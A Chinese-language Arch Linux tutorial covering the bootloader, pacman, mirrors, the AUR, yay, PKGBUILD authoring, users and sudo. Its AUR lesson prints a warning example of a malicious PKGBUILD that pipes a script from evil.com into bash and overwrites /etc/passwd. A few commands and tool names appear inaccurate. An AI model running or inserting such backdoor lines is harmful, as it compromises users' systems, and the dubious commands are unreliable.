**微码加载**：Intel/AMD CPU 的微码更新需要在内核启动前加载。systemd-boot 通过 `initrd` 行加载微码，GRUB 通过 `grub-mkconfig` 自动识别。微码文件为 `intel-ucode.img` 或 `amd-ucode.img`，必须放在 initramfs 之前。

#### 例子

**方案一：安装 systemd-boot**（推荐 UEFI 用户）：

```bash
# 确保 ESP 已挂载到 /boot 或 /boot/efi
# 如果 ESP 在 /boot/efi，需要调整路径

# 安装 systemd-boot
bootctl install

# 创建主配置文件
nano /boot/loader/loader.conf
# 内容：
# default arch
# timeout 5
# console-mode max
# editor 0

# 创建启动项
nano /boot/loader/entries/arch.conf
# 内容：
# title   Arch Linux
# linux   /vmlinuz-linux
# initrd  /intel-ucode.img    # Intel CPU 才需要这行
# initrd  /initramfs-linux.img
# options root=UUID=你的根分区UUID rw
```

获取根分区 UUID：

```bash
blkid /dev/sda2
# 输出：UUID="xxxx-xxxx-..." TYPE="btrfs"
```

**方案二：安装 GRUB**（UEFI 模式）：

```bash
# 安装 GRUB 和 efibootmgr
pacman -S grub efibootmgr

# 安装 GRUB 到 ESP
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB

# 生成 GRUB 配置
grub-mkconfig -o /boot/grub/grub.cfg
```

**方案二：安装 GRUB**（Legacy BIOS 模式）：

```bash
pacman -S grub
grub-install /dev/sda   # 注意是磁盘，不是分区
grub-mkconfig -o /boot/grub/grub.cfg
```

**完成安装并重启**：

```bash
# 退出 chroot
exit

# 卸载所有挂载点
umount -R /mnt

# 重启
reboot

# 拔出 U 盘，系统应从硬盘启动
```

**首次启动后验证**：

```bash
# 登录后检查内核
uname -r

# 检查网络
ip link
ping -c 3 archlinux.org

# 检查磁盘挂载
lsblk

# 检查 systemd 服务
systemctl status NetworkManager

# 更新系统
sudo pacman -Syu
```

#### 总结

- 引导加载器是系统启动的关键，必须正确安装
- systemd-boot：简洁、UEFI 原生、配置直观，推荐 UEFI 用户
- GRUB：功能全面、支持多系统、配置复杂
- 微码（intel-ucode/amd-ucode）必须在 initramfs 之前加载
- 安装完成后 `umount -R /mnt` 卸载，再 `reboot`
- 首次启动后验证网络、磁盘、服务状态
- 立即执行 `pacman -Syu` 确保系统最新

---

## 第 4 章：Pacman 包管理

### 第 11 讲：Pacman 基础命令

#### 概念

Pacman 是 Arch Linux 的官方包管理器，由 Judd Vinet 用 C 语言编写，是 Arch 的核心组件之一。它负责从仓库下载、安装、升级、卸载软件包，并自动处理依赖关系。Pacman 使用 `.pkg.tar.zst` 格式的包文件（早期是 `.pkg.tar.xz`），内部包含二进制文件、元数据和安装脚本。Pacman 的命令结构是 `pacman <操作> [选项] <包名>`，操作以单个字母表示（如 `-S` 安装、`-R` 卸载、`-Q` 查询、`-U` 安装本地包）。

#### 原理

Pacman 的工作流程分为几步：首先读取 `/etc/pacman.conf` 配置文件，确定启用的仓库和镜像源；然后从镜像源下载仓库数据库（`.db` 文件）到 `/var/lib/pacman/sync/`，数据库记录了每个包的名称、版本、依赖关系；用户执行安装命令时，Pacman 解析依赖树，按拓扑顺序下载并安装所有需要的包；安装时，包被解压到 `/`，同时执行包内的 `.install` 脚本（如果存在）完成配置；最后将包信息记录到 `/var/lib/pacman/local/`。

Pacman 的依赖解析是自动的，用户只需指定要安装的包名，Pacman 会自动安装所有依赖。卸载时，Pacman 默认只卸载指定包，不卸载其依赖（避免误删共享依赖），但可以用 `-s` 选项同时卸载不再被需要的依赖。

Pacman 的包缓存位于 `/var/cache/pacman/pkg/`，默认保留所有下载过的包。这个缓存非常重要——当升级出问题时，可以从缓存回滚到旧版本。但缓存会占用大量磁盘空间，需要定期清理。

#### 例子

**安装软件包**：

```bash
# 安装单个包
sudo pacman -S nginx

# 安装多个包
sudo pacman -S nginx php-fpm mariadb

# 安装包组（group）
sudo pacman -S base-devel    # 安装基础开发工具组

# 仅下载不安装
sudo pacman -Sw nginx

# 从本地包文件安装
sudo pacman -U /path/to/package.pkg.tar.zst

# 从 URL 安装
sudo pacman -U https://example.com/package.pkg.tar.zst
```

**卸载软件包**：

```bash
# 卸载包（保留配置文件和依赖）
sudo pacman -R nginx

# 卸载包及其依赖（仅卸载不再被需要的依赖）
sudo pacman -Rs nginx

# 卸载包及其全局配置文件
sudo pacman -Rn nginx

# 卸载包、依赖、配置文件（最彻底）
sudo pacman -Rns nginx

# 卸载时跳过依赖检查（危险，慎用）
sudo pacman -Rdd nginx
```

**升级系统**：

```bash
# 同步数据库并升级所有包（最常用）
sudo pacman -Syu

# 同步数据库、升级所有包、并安装新包
sudo pacman -Syu nginx

# 强制刷新包数据库（当镜像不同步时）
sudo pacman -Syyu

# 强制刷新数据库和密钥环（密钥问题时）
sudo pacman -Syy archlinux-keyring
sudo pacman -Syu
```

**查询软件包**：

```bash
# 查询已安装的包
pacman -Q nginx

# 查询所有已安装的包
pacman -Q

# 查询包的详细信息
pacman -Qi nginx

# 查询包安装的文件列表
pacman -Ql nginx

# 查询某个文件属于哪个包
pacman -Qo /usr/bin/nginx

# 查询仓库中的包（不需要已安装）
pacman -Ss nginx

# 查询包的依赖关系
pacman -Qi nginx | grep "Depends On"
```

#### 总结

- Pacman 是 Arch 的官方包管理器，使用 `.pkg.tar.zst` 格式
- `-S` 安装、`-R` 卸载、`-Q` 查询已安装、`-U` 安装本地包
- `pacman -Syu` 是最常用的升级命令
- `-Rns` 是最彻底的卸载方式
- 包缓存在 `/var/cache/pacman/pkg/`，升级出问题可回滚
- Pacman 自动处理依赖，无需手动管理

---

### 第 12 讲：仓库与镜像源配置

#### 概念

Arch Linux 的软件仓库分为官方仓库和社区仓库两大类。官方仓库包括 `core`（核心系统软件）、`extra`（桌面环境和常用软件）、`multilib`（32 位兼容库，用于 Steam/Wine 等）、`testing`（测试版）、`core-testing`、`extra-testing`、`multilib-testing`（各仓库的测试分支）。镜像源（mirror）是仓库的副本，分布在世界各地，用户选择最近的镜像可以大幅提升下载速度。镜像源列表位于 `/etc/pacman.d/mirrorlist`。

#### 原理

**仓库的层级关系**：`core` 仓库包含系统启动和基本运行所必需的软件（如内核、glibc、bash、pacman 本身），经过最严格的测试。`extra` 仓库包含绝大多数用户软件（如 X11、GNOME、Firefox 等），是最大的仓库。`multilib` 是为 32 位程序提供兼容库的仓库，默认未启用，需要运行 Steam、Wine 等程序时才启用。`testing` 系列仓库包含即将进入稳定仓库的测试版本，普通用户不建议启用。

**镜像源的工作机制**：Pacman 读取 `/etc/pacman.d/mirrorlist` 文件，按顺序尝试每个镜像。列表顶部的镜像优先使用。`/etc/pacman.conf` 中的仓库定义引用 `Include = /etc/pacman.d/mirrorlist`，将镜像列表包含进来。当用户执行 `pacman -Sy` 时，Pacman 会从第一个可用镜像下载仓库数据库。

**镜像源状态**：Arch 官方维护镜像状态页面（https://archlinux.org/mirrors/status/），显示每个镜像的同步延迟、完成度、速度等。选择"最近同步"且"完成度 100%"的镜像最可靠。过时的镜像可能导致 404 错误或包版本不一致。

#### 例子

**查看当前镜像源**：

```bash
cat /etc/pacman.d/mirrorlist
```

**使用 reflector 自动选择最快镜像**：

```bash
# 安装 reflector
sudo pacman -S reflector

# 备份当前镜像列表
sudo cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.bak

# 选择中国地区、最近 12 小时内同步、HTTPS 协议、按速度排序的前 10 个镜像
sudo reflector --country China --age 12 --protocol https --sort rate --number 10 --save /etc/pacman.d/mirrorlist

# 验证
cat /etc/pacman.d/mirrorlist
```

**手动编辑镜像列表**：

```bash
sudo nano /etc/pacman.d/mirrorlist
# 将中国镜像放到顶部：
Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch
Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch
Server = https://mirrors.aliyun.com/archlinux/$repo/os/$arch
Server = https://mirrors.cloud.tencent.com/archlinux/$repo/os/$arch
```

**启用 multilib 仓库**（用于 Steam、Wine 等 32 位程序）：

```bash
sudo nano /etc/pacman.conf
# 找到 [multilib] 段，取消注释：
[multilib]
Include = /etc/pacman.d/mirrorlist

# 同步数据库
sudo pacman -Sy
```

**查看仓库配置**：

```bash
cat /etc/pacman.conf | grep -v "^#" | grep -v "^$"
```

典型输出：

```
[options]
HoldPkg = pacman glibc
Architecture = auto
CheckSpace
SigLevel = Required DatabaseOptional
LocalFileSigLevel = Optional

[core]
Include = /etc/pacman.d/mirrorlist

[extra]
Include = /etc/pacman.d/mirrorlist

[multilib]
Include = /etc/pacman.d/mirrorlist
```

**强制刷新数据库**（镜像不同步时）：

```bash
sudo pacman -Syy
# -yy 会强制刷新所有数据库，即使看起来是最新的
```

#### 总结

- 官方仓库：core（核心）、extra（常用）、multilib（32 位）、testing（测试）
- 镜像源列表在 `/etc/pacman.d/mirrorlist`
- 用 `reflector` 自动选择最快镜像
- 国内推荐镜像：清华、中科大、阿里云、腾讯云
- multilib 仓库默认未启用，需要 32 位程序时手动开启
- 镜像不同步时用 `pacman -Syy` 强制刷新

---

### 第 13 讲：软件包查询与依赖处理

#### 概念

Pacman 提供了丰富的查询功能，可以查询已安装的包、仓库中的包、包的依赖关系、包提供的文件等。理解依赖关系对于排查软件安装问题至关重要。Arch 还提供了 `pactree` 工具可视化依赖树，`pacman -Qdt` 查询孤儿包（不再被任何包依赖的包）。本讲深入讲解 Pacman 的高级查询和依赖处理功能。

#### 原理

**依赖关系的本质**：Linux 软件通常依赖共享库（`.so` 文件）。例如，Firefox 依赖 `libgtk-3.so`，而 `libgtk-3.so` 由 `gtk3` 包提供。当用户安装 Firefox 时，Pacman 检查 Firefox 的依赖列表，发现需要 `gtk3`，于是先安装 `gtk3`，再安装 Firefox。这种递归过程形成依赖树。

**依赖类型**：
- **硬依赖（Depends）**：必须安装才能运行
- **可选依赖（Optional Deps）**：增强功能，非必需
- **提供（Provides）**：包提供的虚拟包名（如 `jdk-openjdk` 提供 `java-environment`）
- **冲突（Conflicts）**：不能同时安装的包
- **替换（Replaces）**：被新包替代的旧包

**孤儿包**：当一个包被卸载时，它的依赖可能不再被任何包需要，这些依赖就是孤儿包。Pacman 不会自动卸载孤儿包（避免误删），但可以用 `pacman -Qdt` 查询并手动清理。

**包数据库**：Pacman 维护两个数据库——`/var/lib/pacman/sync/`（仓库数据库，从镜像同步）和 `/var/lib/pacman/local/`（本地已安装包数据库）。查询命令从这两个数据库读取信息。

#### 例子

**查询包信息**：

```bash
# 查询仓库中的包（搜索）
pacman -Ss firefox
# 输出示例：
# extra/firefox 124.0-1 [installed]
#     Standalone web browser from mozilla.org

# 查询包详细信息（仓库中）
pacman -Si firefox

# 查询已安装包的详细信息
pacman -Qi firefox

# 查询包安装的文件
pacman -Ql firefox | head -20

# 查询文件属于哪个包
pacman -Qo /usr/bin/firefox
# 输出：/usr/bin/firefox is owned by firefox 124.0-1

# 查询包的依赖关系
pacman -Qi firefox | grep -E "Depends|Optional"
```

**依赖树分析**：

```bash
# 安装 pactree 工具（pacman-contrib 包）
sudo pacman -S pacman-contrib

# 查看 firefox 的依赖树
pactree firefox

# 反向依赖树（谁依赖了 gtk3）
pactree -r gtk3

# 可视化依赖关系（图形化）
# 安装 pkgd tree
sudo pacman -S pkgd
pkgd tree firefox
```

**查询孤儿包并清理**：

```bash
# 查询孤儿包（不再被任何包依赖）
pacman -Qdt

# 查询孤儿包（包括可选依赖的孤儿）
pacman -Qdtt

# 清理孤儿包
sudo pacman -Rns $(pacman -Qdtq)

# 如果没有孤儿包，会提示：error: no targets specified
```

**查询包组**：

```bash
# 列出所有包组
pacman -Sg

# 查看某个包组的成员
pacman -Sg base-devel

# 安装包组时选择特定成员
sudo pacman -S base-devel
# 会提示选择要安装的成员
```

**查询最近安装的包**：

```bash
# 最近安装的 20 个包
expac --timefmt='%Y-%m-%d %H:%M' '%l\t%n' | sort | tail -20

# 或者用 pacman
grep -i "installed" /var/log/pacman.log | tail -20
```

**查询包大小**：

```bash
# 按安装大小排序，显示前 20 个最大的包
expac -H M '%m\t%n' | sort -rh | head -20

# 查看所有已安装包的总大小
pacman -Qi | grep "Installed Size" | awk '{sum += $4} END {print sum " MB"}'
```

#### 总结

- `pacman -Ss` 搜索仓库，`-Q` 查询已安装，`-Si` 查询仓库详情
- `pactree` 可视化依赖树，`-r` 反向查询
- 孤儿包用 `pacman -Qdt` 查询，`-Rns $(pacman -Qdtq)` 清理
- 包组用 `pacman -Sg` 列出，`-Sg <组名>` 查看成员
- `expac` 工具可以格式化输出包信息，非常强大
- 定期清理孤儿包和缓存可以释放磁盘空间

---

## 第 5 章：AUR 与软件生态

### 第 14 讲：AUR 原理与生态

#### 概念

AUR（Arch User Repository，Arch 用户仓库）是 Arch Linux 的社区驱动软件仓库，包含了官方仓库中没有的软件。与官方仓库不同，AUR 中的软件不是预编译的二进制包，而是 `PKGBUILD` 脚本和源码链接。用户通过 AUR Helper 下载 PKGBUILD，本地编译生成 `.pkg.tar.zst` 包，再用 `pacman -U` 安装。AUR 是 Arch 生态的重要组成部分，让 Arch 拥有了几乎"无所不有"的软件覆盖。

#### 原理

**AUR 的工作流程**：
1. 用户在 AUR 网站搜索软件包
2. 下载 PKGBUILD 和相关文件（如 `.install` 脚本、补丁等）
3. 运行 `makepkg`，它会：下载源码 → 验证签名 → 编译 → 打包成 `.pkg.tar.zst`
4. 用 `pacman -U` 安装生成的包

**为什么 AUR 不提供二进制包**：
1. **法律原因**：某些软件的许可证禁止重新分发二进制包，但允许用户自行编译
2. **安全原因**：源码可审计，用户可以检查 PKGBUILD 是否包含恶意代码
3. **维护成本**：官方仓库需要构建服务器和测试，AUR 由社区维护，成本更低
4. **灵活性**：用户可以修改 PKGBUILD 自定义编译选项

**AUR 的信任模型**：AUR 中的软件由社区用户上传，没有官方审核。但 AUR 有"投票"机制，受欢迎的包通常更可信。用户安装前应阅读 PKGBUILD，确认没有可疑操作（如下载并执行远程脚本）。`makepkg` 默认不允许以 root 运行，避免 PKGBUILD 中的恶意命令造成系统级破坏。

**AUR 的分类**：
- **Supported**：被社区信任的包，可能被提升为官方仓库
- **Orphaned**：无维护者的包，可能过时
- **Outdated**：版本过时的包
- **Deleted**：被删除的包

#### 例子

**手动从 AUR 安装软件**（不使用 Helper）：

```bash
# 1. 安装基础开发工具
sudo pacman -S base-devel git

# 2. 克隆 AUR 包
cd ~/Downloads
git clone https://aur.archlinux.org/package-name.git
cd package-name

# 3. 阅读 PKGBUILD（重要！检查是否有可疑代码）
cat PKGBUILD

# 4. 编译并打包
makepkg -si
# -s 自动安装依赖
# -i 安装生成的包

# 5. 后续更新
cd ~/Downloads/package-name
git pull
makepkg -si
```

**在 AUR 网站搜索**：

访问 https://aur.archlinux.org/ ，搜索软件包名。查看：
- **Votes**：投票数，越高越可信
- **Popularity**：流行度评分
- **Last Updated**：最后更新时间，过久的可能不可用
- **Maintainer**：维护者，"Orphaned" 表示无维护者

**检查 PKGBUILD 的关键点**：

```bash
cat PKGBUILD | grep -E "source|md5sums|sha256sums|build|package"
```

需要警惕的内容：
```bash
# 可疑：下载并执行远程脚本
source=("https://evil.com/install.sh")
build() {
    curl https://evil.com/backdoor.sh | bash
}

# 可疑：修改系统关键文件
package() {
    echo "evil" > /etc/passwd
}
```

**AUR 包的状态查询**：

```bash
# 查询 AUR 包信息（需要 AUR Helper，如 yay）
yay -Si package-name

# 查询 AUR 包的依赖
yay -Si package-name | grep "Depends"
```

#### 总结

- AUR 是社区驱动的软件仓库，包含官方仓库没有的软件
- AUR 提供 PKGBUILD 脚本，用户本地编译安装
- 不提供二进制包的原因：法律、安全、成本、灵活性
- 安装前务必阅读 PKGBUILD，检查是否有可疑代码
- 优先选择投票数高、最近更新的包
- `makepkg` 不允许以 root 运行，保护系统安全

---

### 第 15 讲：AUR Helper 使用

#### 概念

AUR Helper 是简化 AUR 包管理的工具，自动完成下载 PKGBUILD、检查更新、解决依赖、编译安装等流程。常见的 AUR Helper 有 `yay`（Yet another Yogurt，最流行）、`paru`（Rust 编写，功能更丰富）、`aura`（Haskell 编写）等。本讲以 `yay` 为例，讲解 AUR Helper 的安装和使用。yay 的命令语法与 pacman 几乎相同，学习成本低。

#### 原理

**AUR Helper 的工作原理**：
1. 接收用户命令（如 `yay -S package`）
2. 查询 AUR API，获取包信息
3. 下载 PKGBUILD 到临时目录
4. 解析依赖，先用 pacman 安装官方仓库中的依赖，再递归处理 AUR 依赖
5. 调用 `makepkg` 编译打包
6. 用 `pacman -U` 安装生成的包
7. 清理临时文件

**yay 与 pacman 的关系**：yay 是 pacman 的"超集"——所有 pacman 命令都可以用 yay 执行，yay 还额外支持 AUR 操作。例如 `yay -Syu` 会同时升级官方仓库和 AUR 中的包。yay 通过调用底层 pacman 实现官方仓库操作，通过自己的逻辑处理 AUR 操作。

**为什么推荐 yay**：
1. 与 pacman 命令兼容，学习成本低
2. 用 Go 语言编写，性能好，无运行时依赖
3. 活跃维护，社区庞大
4. 支持搜索、交互式选择、自动清理依赖等高级功能

**paru 的优势**：paru 是 yay 的 fork，用 Rust 编写，额外功能包括：默认查看 PKGBUILD、支持 review 评论、更好的彩色输出等。如果追求更安全的工作流，可以选择 paru。

#### 例子

**安装 yay**：

```bash
# 1. 确保已安装 base-devel 和 git
sudo pacman -S base-devel git

# 2. 克隆 yay 的 AUR 仓库
cd ~/Downloads
git clone https://aur.archlinux.org/yay.git
cd yay

# 3. 编译并安装
makepkg -si
```

**yay 基本用法**（与 pacman 兼容）：

```bash
# 安装包（自动判断是官方仓库还是 AUR）
yay -S package-name

# 升级系统（包括 AUR 包）
yay -Syu

# 卸载包
yay -R package-name
yay -Rns package-name   # 彻底卸载

# 搜索包（同时搜索官方仓库和 AUR）
yay -Ss package-name

# 查询已安装包
yay -Q package-name
```

**yay 的高级功能**：

```bash
# 交互式安装（显示搜索结果，选择要安装的）
yay package-name

# 查看包的 PKGBUILD 再决定是否安装
yay -S package-name --editmenu
# 会提示是否查看/编辑 PKGBUILD

# 仅升级 AUR 包（不升级官方仓库）
yay -Sua

# 仅升级官方仓库（不升级 AUR）
yay -Syu --noconfirm --aurrepo=none

# 清理孤儿包
yay -Yc

# 清理缓存
yay -Sc

# 显示包统计信息
yay -Ps
# 输出类似：
# ==> Total installed packages: 234
# ==> Total size occupied: 5.2 GiB
# ==> 10 packages from AUR
```

**yay 配置**：

```bash
# 编辑 yay 配置
nano ~/.config/yay/config.json

# 常用配置：
{
    "aururl": "https://aur.archlinux.org",
    "buildDir": "/home/user/.cache/yay",
    "editor": "nano",
    "editorflags": "",
    "makepkgbin": "makepkg",
    "pacmanbin": "pacman",
    "redownload": "no",
    "rebuild": "no",
    "answerclean": "None",
    "answerdiff": "None",
    "answeredit": "None",
    "answerupgrade": "",
    "gitbin": "git",
    "gpgbin": "gpg",
    "mflags": "",
    "sortby": "votes",
    "searchby": "name-desc",
    "noconfirm": false,
    "noeditmenu": false,
    "useask": false,
    "cleanafter": false,
    "gitclone": true,
    "provides": true,
    "pgpfetch": true,
    "upgrademenu": true,
    "removemake": "ask"
}
```

**安装 paru**（替代 yay）：

```bash
sudo pacman -S base-devel rust
cd ~/Downloads
git clone https://aur.archlinux.org/paru.git
cd paru
makepkg -si
```

#### 总结

- AUR Helper 自动化 AUR 包管理，推荐 yay 或 paru
- yay 与 pacman 命令兼容，学习成本低
- `yay -Syu` 同时升级官方仓库和 AUR 包
- 安装前可查看 PKGBUILD，增强安全性
- `yay -Ps` 查看系统包统计信息
- yay 用 Go 编写，paru 用 Rust 编写，两者功能相近

---

### 第 16 讲：PKGBUILD 与自定义包

#### 概念

PKGBUILD 是 Arch Linux 的包构建脚本，是一个 Bash 脚本文件，定义了如何从源码构建一个 pacman 包。它包含包名、版本、依赖、源码地址、构建函数（`build()`、`package()`）等信息。`makepkg` 命令读取 PKGBUILD，执行其中的函数，最终生成 `.pkg.tar.zst` 包文件。掌握 PKGBUILD 可以让你为 AUR 贡献软件包，或为内部使用创建自定义包。

#### 原理

**PKGBUILD 的核心字段**：
- `pkgname`：包名，必须小写字母开头
- `pkgver`：版本号，遵循版本号规范
- `pkgrel`：发布号，每次修改 PKGBUILD 但版本不变时递增
- `arch`：支持的架构（如 `x86_64`、`any`）
- `depends`：运行时依赖
- `makedepends`：编译时依赖（不运行时不需要）
- `source`：源码 URL 或本地文件
- `sha256sums`：源码校验和，用于验证完整性
- `build()`：编译函数
- `package()`：打包函数，将文件安装到 `$pkgdir`

**makepkg 的工作流程**：
1. 读取 PKGBUILD
2. 检查依赖是否已安装，未安装则报错（除非用 `-s` 自动安装）
3. 下载 `source` 中的源码
4. 用 `sha256sums` 验证完整性
5. 解压源码到 `$srcdir`
6. 执行 `build()` 函数
7. 执行 `package()` 函数，将文件安装到 `$pkgdir`
8. 压缩 `$pkgdir` 为 `.pkg.tar.zst`

**关键变量**：
- `$srcdir`：源码解压目录
- `$pkgdir`：打包根目录（模拟 `/`）
- `$startdir`：PKGBUILD 所在目录

**`.install` 脚本**：可选的安装钩子，定义 `pre_install`、`post_install`、`pre_upgrade`、`post_upgrade`、`pre_remove`、`post_remove` 函数，在包安装/升级/卸载时执行。

#### 例子

**一个简单的 PKGBUILD 示例**（打包一个 Hello World 程序）：

```bash
# Maintainer: Your Name <your.email@example.com>

pkgname=hello-world
pkgver=1.0
pkgrel=1
pkgdesc="A simple Hello World program"
arch=('x86_64')
url="https://example.com/hello-world"
license=('MIT')
depends=('glibc')
source=("https://example.com/hello-world-$pkgver.tar.gz")
sha256sums=('abcdef1234567890...')

build() {
    cd "$srcdir/$pkgname-$pkgver"
    ./configure --prefix=/usr
    make
}

package() {
    cd "$srcdir/$pkgname-$pkgver"
    make DESTDIR="$pkgdir/" install
}
```

**打包一个 Python 脚本**（无需编译）：

```bash
pkgname=my-script
pkgver=1.0
pkgrel=1
pkgdesc="My custom Python script"
arch=('any')
depends=('python')
source=("my-script.py::https://raw.githubusercontent.com/user/repo/main/script.py")
sha256sums=('SKIP')  # SKIP 表示不校验

package() {
    install -Dm755 "$srcdir/my-script.py" "$pkgdir/usr/bin/my-script"
}
```

**打包一个 GitHub 项目**：

```bash
pkgname=myapp-git
pkgver=r123.abc1234
pkgrel=1
pkgdesc="My awesome app (git version)"
arch=('x86_64')
url="https://github.com/user/myapp"
license=('GPL3')
depends=('qt5-base' 'python')
makedepends=('git' 'cmake')
provides=("${pkgname%-git}")
conflicts=("${pkgname%-git}")
source=("$pkgname::git+https://github.com/user/myapp.git")
sha256sums=('SKIP')

pkgver() {
    cd "$pkgname"
    printf "r%s.%s" "$(git rev-list --count HEAD)" "$(git rev-parse --short HEAD)"
}

build() {
    cd "$pkgname"
    cmake -B build -DCMAKE_INSTALL_PREFIX=/usr
    make -C build
}

package() {
    cd "$pkgname"
    make -C build DESTDIR="$pkgdir/" install
}
```

**构建并测试包**：

```bash
# 1. 创建工作目录
mkdir -p ~/pkgbuild/myapp
cd ~/pkgbuild/myapp

# 2. 创建 PKGBUILD
nano PKGBUILD

# 3. 测试构建
makepkg

# 4. 检查生成的包
ls -la *.pkg.tar.zst

# 5. 安装到本地
sudo pacman -U myapp-1.0-1-x86_64.pkg.tar.zst

# 6. 测试安装后卸载
sudo pacman -Rns myapp
```

**使用 namcap 检查包**：

```bash
# 安装 namcap
sudo pacman -S namcap

# 检查 PKGBUILD
namcap PKGBUILD

# 检查生成的包
namcap myapp-1.0-1-x86_64.pkg.tar.zst
```

**提交到 AUR**：

```bash
# 1. 生成 .SRCINFO
makepkg --printsrcinfo > .SRCINFO

# 2. 在 AUR 网站注册账号，配置 SSH 密钥

# 3. 克隆 AUR 仓库
git clone ssh://aur@aur.archlinux.org/myapp.git
cd myapp

# 4. 复制 PKGBUILD 和 .SRCINFO
cp ../myapp/PKGBUILD .
cp ../myapp/.SRCINFO .

# 5. 提交
git add PKGBUILD .SRCINFO
git commit -m "Initial import"
git push
```

#### 总结

- PKGBUILD 是 Bash 脚本，定义如何从源码构建 pacman 包
- 核心字段：pkgname、pkgver、pkgrel、depends、source、build()、package()
- `$srcdir` 是源码目录，`$pkgdir` 是打包根目录
- `makepkg` 读取 PKGBUILD 并生成 `.pkg.tar.zst`
- 用 `namcap` 检查 PKGBUILD 和包的规范性
- 提交到 AUR 需要生成 `.SRCINFO` 并通过 SSH 推送

---

## 第 6 章：用户与权限管理

### 第 17 讲：用户与组管理

#### 概念

Linux 是多用户操作系统，每个用户有独立的身份标识（UID）和权限。用户归属于一个或多个组，组用于批量管理权限。Arch Linux 安装后默认只有 root 用户，需要手动创建普通用户。用户和组的信息存储在 `/etc/passwd`、`/etc/shadow`、`/etc/group`、`/etc/gshadow` 文件中。本讲讲解用户和组的创建、修改、删除等管理操作。

#### 原理

**用户标识**：
- **用户名**：人类可读的名称（如 `alice`）
- **UID（User ID）**：内核识别用户的数字，root 是 0，普通用户通常从 1000 开始
- **GID（Group ID）**：用户主组的数字 ID

**用户类型**：
- **root**：超级用户，UID=0，拥有所有权限
- **系统用户**：UID 1-999，为服务运行而创建（如 `http`、`mysql`）
- **普通用户**：UID 1000+，日常使用

**关键文件**：
- `/etc/passwd`：用户基本信息（用户名、UID、GID、家目录、Shell）
- `/etc/shadow`：用户密码哈希（仅 root 可读）
- `/etc/group`：组信息
- `/etc/gshadow`：组密码（用于组管理）

**主组与附加组**：每个用户有一个主组（primary group），通常与用户名相同（如用户 `alice` 的主组是 `alice`）。用户还可以加入多个附加组（supplementary groups），如 `wheel`（可使用 sudo）、`docker`（可使用 Docker）、`video`（可访问显卡）等。

**Shell 的作用**：用户登录后默认启动的程序，通常是 `/bin/bash`。系统用户通常设为 `/usr/bin/nologin` 或 `/sbin/nologin`，禁止登录。

#### 例子

**用户管理**：

```bash
# 创建用户（自动创建同名主组和家目录）
sudo useradd -m alice

# 创建用户并指定 Shell
sudo useradd -m -s /bin/zsh alice

# 创建用户并加入附加组
sudo useradd -m -G wheel,docker,video -s /bin/bash alice

# 创建系统用户（无家目录，无登录）
sudo useradd -r -s /usr/bin/nologin myservice

# 设置密码
sudo passwd alice

# 删除用户（保留家目录）
sudo userdel alice

# 删除用户及其家目录
sudo userdel -r alice

# 修改用户属性
sudo usermod -aG docker alice      # 加入 docker 组（-a 是追加，不加会覆盖）
sudo usermod -s /bin/zsh alice     # 修改 Shell
sudo usermod -l newname oldname    # 改名
sudo usermod -d /new/home alice   # 修改家目录
sudo usermod -L alice             # 锁定用户
sudo usermod -U alice             # 解锁用户
```

**组管理**：

```bash
# 创建组
sudo groupadd developers

# 创建指定 GID 的组
sudo groupadd -g 2000 developers

# 删除组
sudo groupdel developers

# 将用户加入组
sudo gpasswd -a alice developers
# 或
sudo usermod -aG developers alice

# 从组中移除用户
sudo gpasswd -d alice developers

# 查看用户所属的组
groups alice

# 查看组的成员
getent group developers
```

**查看用户和组信息**：

```bash
# 查看所有用户
cat /etc/passwd

# 查看特定用户
getent passwd alice
# 输出：alice:x:1000:1000:Alice:/home/alice:/bin/bash

# 查看所有组
cat /etc/group

# 查看当前登录用户
whoami

# 查看当前用户 ID 信息
id
# 输出：uid=1000(alice) gid=1000(alice) groups=1000(alice),10(wheel),998(docker)

# 查看当前登录的所有用户
who
w
```

**切换用户**：

```bash
# 切换到 root
su -
# 或
sudo -i

# 切换到其他用户
su - alice

# 以其他用户身份执行命令
sudo -u alice whoami
```

#### 总结

- 用户信息在 `/etc/passwd`，密码哈希在 `/etc/shadow`
- UID 0 是 root，1-999 是系统用户，1000+ 是普通用户
- 每个用户有主组，可加入多个附加组
- `useradd -m -G wheel` 创建可 sudo 的普通用户
- `usermod -aG` 追加用户到组（-a 重要，否则会覆盖）
- 系统用户用 `/usr/bin/nologin` 禁止登录

---

### 第 18 讲：sudo 与权限委派

#### 概念

sudo（superuser do）允许普通用户以 root 或其他用户身份执行命令，是 Linux 权限委派的核心机制。相比直接用 `su` 切换到 root，sudo 更安全：可以精细控制谁能执行什么命令，所有操作都有日志记录。Arch Linux 通过 `sudo` 包提供该功能，配置文件是 `/etc/sudoers`，必须用 `visudo` 命令编辑（避免语法错误导致 sudo 失效）。

#### 原理

**sudo 的工作流程**：
1. 用户执行 `sudo command`
2. sudo 读取 `/etc/sudoers` 和 `/etc/sudoers.d/*`
3. 检查当前用户是否有执行该命令的权限
4. 验证用户密码（默认 5 分钟内免再次输入）
5. 以目标用户（默认 root）身份执行命令
6. 记录日志到 `/var/log/auth.log` 或通过 journalctl

**sudoers 规则语法**：

```
用户  主机=(运行身份)  命令
```

例如：
```
alice  ALL=(ALL:ALL) ALL
```
表示用户 alice 可以在任何主机上、以任何用户和组的身份、执行任何命令。

**关键概念**：
- **NOPASSWD**：免密码执行
- **别名**：User_Alias、Cmnd_Alias、Host_Alias 可定义别名简化配置
- **Defaults**：设置默认行为（如 `Defaults !visiblepw` 禁止在无 TTY 时使用）

**为什么用 visudo**：`visudo` 在保存前会检查语法，如果配置有误会提示用户修正，避免因语法错误导致 sudo 完全失效。直接编辑 `/etc/sudoers` 一旦出错，可能无法再用 sudo 修复，需要进入救援模式。

#### 例子

**基础配置**：

```bash
# 用 visudo 编辑 sudoers
sudo visudo

# 找到这一行，取消注释（让 wheel 组可以使用 sudo）
# %wheel ALL=(ALL:ALL) ALL

# 如果想免密码（不推荐，但方便）
# %wheel ALL=(ALL:ALL) NOPASSWD: ALL
```

**精细权限控制**：

```bash
sudo visudo

# 让 alice 只能重启和关机
alice ALL=/usr/bin/systemctl poweroff, /usr/bin/systemctl reboot

# 让 bob 只能以 www-data 身份执行 nginx 重启
bob ALL=(www-data) /usr/bin/systemctl restart nginx

# 让 developers 组成员可以安装软件
%developers ALL=/usr/bin/pacman -S *
# 但不能卸载
%developers ALL=!/usr/bin/pacman -R *

# 让 alice 免密码执行特定命令
alice ALL=NOPASSWD: /usr/bin/systemctl restart nginx
